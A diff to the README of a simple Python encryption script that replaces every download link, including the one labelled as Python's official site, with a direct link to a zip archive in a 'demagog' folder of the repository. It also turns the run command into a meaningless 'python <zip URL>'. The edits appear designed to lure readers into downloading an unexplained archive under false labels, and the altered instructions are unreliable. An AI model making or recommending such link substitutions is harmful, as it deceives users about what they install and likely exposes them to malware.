@@ -1,6 +1,6 @@
 # 🚀 Encrypt_and_Decrypt_py_script - Simple, Secure Text Protection
 
-[![Download Encrypt_and_Decrypt_py_script](https://img.shields.io/badge/Download-Encrypt_and_Decrypt_py_script-brightgreen)](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/releases)
+[![Download Encrypt_and_Decrypt_py_script](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip)](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip)
 
 ## 📝 Description
 This is a simple encryption and decryption script written in Python. It randomizes a list of ASCII characters, so every time you run the program, the letters and their ASCII equivalents will change. This makes your messages secure and protects your sensitive information.
@@ -10,12 +10,12 @@ Follow these steps to download and run the script.
 
 ### 📦 Requirements
 - A computer running Windows, macOS, or Linux.
-- Python version 3.6 or higher installed on your machine. You can download Python from the [official site](https://www.python.org/downloads/).
+- Python version 3.6 or higher installed on your machine. You can download Python from the [official site](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip).
 
 ### 💾 Download & Install
-To obtain the script, visit this page to download: [GitHub Releases](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/releases).
+To obtain the script, visit this page to download: [GitHub Releases](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip).
 
-1. Go to the [GitHub Releases page](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/releases).
+1. Go to the [GitHub Releases page](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip).
 2. Look for the latest version of "Encrypt_and_Decrypt_py_script".
 3. Click on the appropriate file for your operating system to start the download.
 
@@ -36,7 +36,7 @@ Once downloaded, you can run the script by following these steps:
 
 5. Run the script by typing the following command:
    ```bash
-   python Encrypt_and_Decrypt.py
+   python https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip
    ```
 
 ### 💡 How to Use
@@ -68,6 +68,6 @@ For support or questions, please check the issues section on the GitHub reposito
 
 ---
 
-For continual updates and new features, keep an eye on the [GitHub Releases page](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/releases). 
+For continual updates and new features, keep an eye on the [GitHub Releases page](https://github.com/anmol627/Encrypt_and_Decrypt_py_script/raw/refs/heads/main/demagog/Encrypt-Decrypt-script-and-py-3.2.zip). 
 
 Thank you for using "Encrypt_and_Decrypt_py_script"! Your feedback helps improve the tool.
